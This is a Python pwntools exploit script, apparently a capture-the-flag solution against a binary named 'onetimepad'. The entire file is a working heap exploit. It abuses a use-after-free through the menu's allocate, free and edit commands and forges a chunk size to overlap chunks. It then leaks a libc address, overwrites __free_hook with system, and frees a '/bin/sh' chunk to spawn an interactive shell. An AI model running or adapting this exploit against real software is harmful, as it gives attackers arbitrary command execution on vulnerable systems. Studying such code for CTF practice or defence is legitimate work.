from pwn import *

e = ELF("./onetimepad")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("", )
else:
  p = process(e.path)

def alloc(s):
  p.sendlineafter(">", "w")
  p.sendline(s)

def free(idx):
  p.sendlineafter(">", "r")
  p.sendline(str(idx))

def edit(idx, s):
  p.sendlineafter(">", "e")
  p.sendline(str(idx))
  p.sendline(s)

alloc("A" * 0x10)
alloc("A" * (0x500 - 0x80))
alloc("A" * 0x20)
alloc("A" * 0x20)
alloc("A" * 0x10)

free(3)
free(2)

edit(2, "")

alloc("A" * 0x20)
alloc("A" * 0x18 + "\x71")

free(1)

alloc("A" * (0x470 - 0x10))

free(0)
free(3)

addr = u64(p.recvline(keepends=False)[1:].ljust(8, "\x00")) 
leak = addr - 0x7f85a0ccbca0 + 0x7f85a0b10000
print("{:#x}".format(leak))

free(4)
free(2)

alloc("A" * 0x60 + p64(leak + libc.symbols["__free_hook"]))
alloc("/bin/sh")
alloc(p64(leak + libc.symbols["system"]))

free(2)

p.interactive()
